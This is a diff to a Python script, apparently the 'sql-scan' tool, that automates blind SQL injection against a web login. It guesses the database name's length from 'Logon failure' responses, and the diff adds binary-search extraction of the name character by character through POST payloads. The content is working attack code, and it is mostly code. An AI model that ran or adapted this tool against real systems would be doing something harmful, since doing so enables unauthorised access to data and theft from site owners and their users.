@@ -16,6 +16,12 @@ Logo = f'''
                 Github==>https://github.com/interstin/sql-scan 
                 {Version}  '''
 
+#响应页面关键词
+message="Logon failure"
+
+#要搜索的数据
+s_data="hello"
+
 #get请求
 def get(url,payload):
     url=url+payload
@@ -32,7 +38,7 @@ def post(url,payload,data):
     return result
 
 
-s_data="hello"
+
 #搜索对应数据
 def search_data(data):
     soup = BeautifulSoup(data, 'html.parser')
@@ -63,7 +69,7 @@ def fuzz_len(url,method,data):
                 while len<20:
                     payload = payload.replace("*",str(len))
                     result = post(url,payload,data)
-                    if "Logon failure" in result:
+                    if message in result:
                         #print(result)
                         print("数据库的长度为：{}".format(len))
                         return len
@@ -80,37 +86,32 @@ def fuzz_size(url,len,method,data):
             if method =='get':
                 result = get(url,payload)
             elif method =='post':
+                print("数据库名为:",end='')
                 while time <= len:
+                    low = 32
+                    high = 128
+                    mid = (high + low) // 2
                     payload = payload.replace("len",str(time))
-                    while 
+                    while low < high:
+                        payload = payload.replace("size",str(mid))
+                        result = post(url,payload,data)
+                        if message in result:
+                            high = mid
+                        else:
+                            low += 1
+                        payload = payload.replace(str(mid),"size")
+                        mid = (low+high)//2
+                    print(chr(low),end='')
                     result = post(url,payload,data)
-
+                    payload = payload.replace(str(time),"len")
+                    time += 1
 
 
         
 
 def scan(url,method,data):
-    fuzz_len(url,method,data)
-
-    with open('len.txt','r') as file:
-        for payload in file:
-            if data==None:
-                data =''
-            len = 1
-            if method =='get':
-                result = get(url,payload)
-            elif method =='post':
-                #猜数据库长度
-                while len<20:
-                    payload = payload.replace("*",str(len))
-                    result = post(url,payload,data)
-                    if "Logon failure" in result:
-                        #print(result)
-                        print("数据库的长度为：{}".format(len))
-                        break
-                    payload = payload.replace(str(len),"*")
-                    len+=1
-                
+    len = fuzz_len(url,method,data)
+    fuzz_size(url,len,method,data)
             
             #判断是否存在注入
             #check_sql(url,method,data,payload)
